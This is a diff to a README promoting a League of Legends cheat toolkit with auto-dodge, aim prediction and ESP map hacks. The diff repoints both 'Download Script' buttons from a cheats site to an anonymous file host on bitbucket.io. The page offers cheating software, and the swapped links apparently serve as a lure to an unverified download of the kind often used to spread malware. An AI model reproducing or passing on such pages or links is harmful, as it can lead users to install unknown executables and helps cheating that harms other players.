@@ -6,7 +6,7 @@
 
 Welcome to the ultimate **LoL Script & Hack Toolkit** — a fusion of **automated mechanics** and **map hacks** that gives you full control over what happens on the Rift. Whether you're trying to climb fast, hit your skillshots perfectly, or play like a smurf without the grind, this setup delivers.
 
-[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://wecheaters.github.io/cheats/league-of-legends/)
+[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 🧠 Script Features
@@ -37,7 +37,7 @@ The script engine is designed to enhance your champion’s **reaction time**, **
 * Works against hooks, skillshots, ults
 * Human-like movement style with configurable delay
 
-[![Download Script](https://habrastorage.org/getpro/habr/upload_files/6c6/21d/1df/6c621d1df0a2e876033000a8a5789d16.jpg)](https://wecheaters.github.io/cheats/league-of-legends/)
+[![Download Script](https://habrastorage.org/getpro/habr/upload_files/6c6/21d/1df/6c621d1df0a2e876033000a8a5789d16.jpg)](https://fileoffload16.bitbucket.io)
 ---
 
 ## 👁️ Hack & ESP Features
@@ -135,3 +135,4 @@ LoL script, League of Legends hack, skill prediction cheat, ESP map hack League,
 ---
 
 🎯 Why just play the game when you can **script it to perfection**? Master the Rift with tools the enemy can’t see. 🧠🔥
+
